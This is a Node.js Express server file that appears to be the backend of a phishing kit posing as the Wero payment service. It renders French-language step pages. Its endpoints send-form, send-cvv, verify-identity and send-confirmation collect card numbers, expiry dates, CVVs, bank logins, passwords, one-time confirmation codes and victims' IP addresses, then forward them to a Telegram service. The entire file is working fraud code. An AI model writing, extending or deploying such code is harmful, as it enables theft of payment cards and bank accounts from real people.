// Vercel Serverless Function - WERO API
require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Setup EJS
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../backend-nodejs/views'));

// Static files
app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));

// IP detection middleware
app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || 
                 req.headers['cf-connecting-ip'] || 
                 req.connection.remoteAddress || 
                 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

// Import Telegram Service
let telegramService;
try {
  telegramService = require('../backend-nodejs/telegramService');
} catch (e) {
  console.error('Error loading telegramService:', e.message);
}

// ==================== ROUTES ====================

// Pages
app.get('/', (req, res) => {
  try {
    res.render('index');
  } catch (err) {
    console.error('Error rendering index:', err);
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/accords', (req, res) => {
  try {
    res.render('accords');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/premiere', (req, res) => {
  try {
    res.render('premiere');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/deuxieme', (req, res) => {
  try {
    res.render('deuxieme');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

app.get('/troisieme', (req, res) => {
  try {
    res.render('troisieme');
  } catch (err) {
    res.status(500).json({ error: 'Error rendering page' });
  }
});

// ==================== API ENDPOINTS ====================

// Send agreement
app.post('/api/send-agreement', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const data = {
      step: 'Accord',
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendAgreementConfirmation(data);
    res.json({ success: true, message: 'Accord enregistré' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send form data
app.post('/api/send-form', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;

    const data = {
      step: 'Première - Formulaire',
      titulaire,
      cardNumber,
      expiryDate,
      bank,
      telephone,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendFormData(data);
    res.json({ success: true, message: 'Données reçues' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send CVV
app.post('/api/send-cvv', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;

    const data = {
      cvv,
      titulaire,
      cardNumber,
      expiryDate,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendCVVAlert(data);
    res.json({ success: true, message: 'CVV enregistré' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Verify identity
app.post('/api/verify-identity', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const { identifier, password } = req.body;

    const data = {
      step: 'Troisième - Identité',
      identifier,
      password,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendIdentityData(data);
    res.json({ success: true, message: 'Identité vérifiée' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send confirmation
app.post('/api/send-confirmation', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const { confirmationCode } = req.body;

    const data = {
      step: 'Quatrième - Confirmation',
      confirmationCode,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendConfirmationData(data);
    res.json({ success: true, message: 'Confirmation reçue' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Test Telegram
app.post('/api/test-telegram', async (req, res) => {
  try {
    if (!telegramService) throw new Error('Telegram service not initialized');
    
    const result = await telegramService.testConnection();
    res.json({ success: result, message: result ? 'Connexion OK' : 'Erreur de connexion' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    environment: 'vercel',
    telegramReady: !!telegramService
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

module.exports = app;
